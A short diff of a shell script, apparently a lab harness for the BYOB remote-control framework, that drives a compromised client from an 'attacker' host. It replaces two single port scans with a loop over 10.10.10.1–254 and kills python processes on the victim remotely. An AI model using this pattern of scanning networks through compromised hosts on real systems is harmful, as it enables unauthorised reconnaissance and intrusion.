@@ -20,11 +20,9 @@ compromisedPid=$!
 sleep 5 # let the victim connect
 
 
-ssh attacker "byossh -t 10 compromised portscanner 10.10.10.3 >> /tmp/port-results && cat /tmp/port-results"
-
-sleep 2
-
-ssh attacker "byossh -t 10 compromised portscanner 10.10.10.4 >> /tmp/port-results && cat /tmp/port-results"
+for ip in 10.10.10.{1..254}; do
+    ssh attacker "byossh -t 10 compromised portscanner $ip >> /tmp/port-results && cat /tmp/port-results"
+done
 
 # Kill byob on client via byob
 ssh attacker "byossh compromised sudo kill \$(ps -e | grep python | awk '{print \$1}')"
